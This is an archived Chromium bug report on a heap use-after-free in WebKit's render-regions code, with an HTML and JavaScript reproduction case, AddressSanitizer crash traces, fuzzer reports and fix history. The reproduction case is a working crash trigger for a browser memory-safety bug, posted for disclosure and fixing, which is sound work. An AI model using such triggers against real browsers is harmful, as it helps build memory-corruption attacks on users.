# Heap-use-after-free in WebCore::RenderRegion::offsetFromLogicalTopOfFirstPage

| Field | Value |
|-------|-------|
| **Issue ID** | [40052187](https://issues.chromium.org/issues/40052187) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2011-12-15 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use after free with render regions

**VERSION**  

Chrome Version:

Chromium 18.0.973.0 (Developer Build 114678)  

OS Linux  

WebKit 535.14 (trunk@102970)  

JavaScript V8 3.7.12.6

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-flow-from: a;
content: counter(c);
}
#el2 {
-webkit-flow-into: a;
}
#el3 {
-webkit-transform: rotateY(0);
}
</style>
<script>
function crash(){
el0 = document.createElement('div')
el0.setAttribute('id', 'el0')
document.body.appendChild(el0)
el1 = document.createElement('div')
document.body.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el2.appendChild(document.createTextNode('A'))
el3 = document.createElement('input')
el3.setAttribute('id', 'el3')
el2.appendChild(el3)
el2.style.display='inline-block'
el3.style.display='run-in'
document.body.style.zoom=2
document.execCommand('selectall')
document.execCommand('italic')
el2.style.display='table-header-group'
document.body.style.zoom=1
}
window.onload=crash
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

=================================================================  

==30863== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed2bb158 at pc 0x55555a99c65a bp 0x7fffffff71c0 sp 0x7fffffff71b8  

READ of size 1 at 0x7fffed2bb158 thread T0  

#0 0x55555a99c65a in WebCore::RenderRegion::offsetFromLogicalTopOfFirstPage() const ???:0  

#1 0x55555a7ded58 in WebCore::RenderBlock::clampToStartAndEndRegions(WebCore::RenderRegion\*) const ???:0

0x7fffed2bb158 is located 216 bytes inside of 224-byte region [0x7fffed2bb080,0x7fffed2bb160)  

freed by thread T0 here:  

#0 0x55555cea3354 in free ??:0  

#1 0x5555595c265c in WebCore::Node::detach() ???:0  

#2 0x555559588a08 in WebCore::Element::detach() ???:0  

#3 0x555559589ea6 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) ???:0

## Attachments

- [216224.html](attachments/216224.html) (text/html; charset=us-ascii, 1.1 KB)
- [216224-asan.txt](attachments/216224-asan.txt) (text/x-c; charset=us-ascii, 11.4 KB)
- [backup.zip](attachments/backup.zip) (application/zip; charset=binary, 7.8 KB)

## Timeline

### in...@chromium.org (2011-12-17)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=4753243

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x7f55177c9158
Crash State:
  - crash stack -
  WebCore::RenderRegion::offsetFromLogicalTopOfFirstPage
  WebCore::RenderBlock::clampToStartAndEndRegions
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  

Minimized Testcase (0.95 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95K9ncHQJ75QTZvIhF5LYA9Cv2iARRSbt0d8QIRfVucckrNRJPtJxkw5dWDlOozJEkeIolAfgylgAIVbN29e8cWj3LPo52bTTCOzo2ssp76g-r2rhWxNDzOT5_sCM8pQOnd8B_xjwuS_FQKas-OhV6o6q4Ziw

### in...@chromium.org (2011-12-17)

This might sound crazy, but it is truth, and we have to find out why that happens. Basically, it does not crash on stable (v16) and beta (same as stable atm), but does crash on r106670 which is way before stable [clusterfuzz verified, also verified manually]. So, this is like it was problem before, then something magically fixed it on stable and then something broke it again on trunk. My theory is that regions code might not be enabled on stable branches, only that can explain this behavior.

### in...@chromium.org (2011-12-17)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-12-17)

Filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=74781

### in...@chromium.org (2011-12-29)

Got our regions expert Mihnea@Adobe for this :)

### in...@chromium.org (2012-01-05)

http://trac.webkit.org/changeset/104121

### in...@chromium.org (2012-01-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-24)

merged to m17 in r105784

### in...@chromium.org (2012-01-24)

rolled out in r105817
fixed compile in r105818

### sc...@gmail.com (2012-01-25)

@miaubiz: nice regression catch. $1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-02-15)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### ke...@chromium.org (2012-07-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 116491:116499.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=4753243

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x7f55177c9158
Crash State:
  - crash stack -
  WebCore::RenderRegion::offsetFromLogicalTopOfFirstPage
  WebCore::RenderBlock::clampToStartAndEndRegions
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=116491:116499

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95K9ncHQJ75QTZvIhF5LYA9Cv2iARRSbt0d8QIRfVucckrNRJPtJxkw5dWDlOozJEkeIolAfgylgAIVbN29e8cWj3LPo52bTTCOzo2ssp76g-r2rhWxNDzOT5_sCM8pQOnd8B_xjwuS_FQKas-OhV6o6q4Ziw

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/107758?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052187)*
